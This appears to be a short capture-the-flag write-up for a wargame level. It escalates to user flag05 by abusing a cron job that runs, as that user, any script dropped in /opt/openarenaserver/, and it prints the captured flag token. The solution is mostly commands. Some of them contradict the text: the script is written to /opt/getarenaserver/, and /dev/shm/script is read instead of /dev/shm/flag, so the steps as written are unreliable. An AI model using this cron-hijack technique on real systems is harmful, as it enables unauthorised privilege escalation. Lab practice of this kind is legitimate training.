find / -name mail
cat /rofs/var/mail/level05

	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
Googling "*/2 * * * *" this seems to be a cron schedule expression that executes the
script openarenaserver every two minutes"
man crontab
This openarenaserver is a script, extracting it with scp gives us this:

#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

This seems to be a loop which executes commands from /opt/openarenaserver/
-> getfacl /usr/sbin/openarenaserver
	to see that the script will run as user flag05. Easy.

lets insert a command int /opt/openarenaserver so that getflag is executed as user flag05:

echo 'getflag > /dev/shm/flag' > /opt/getarenaserver/script
wait for two minutes at most and:
cat /dev/shm/script will show:
	Check flag.Here is your toke: viuaaale9huek52boumoomioc
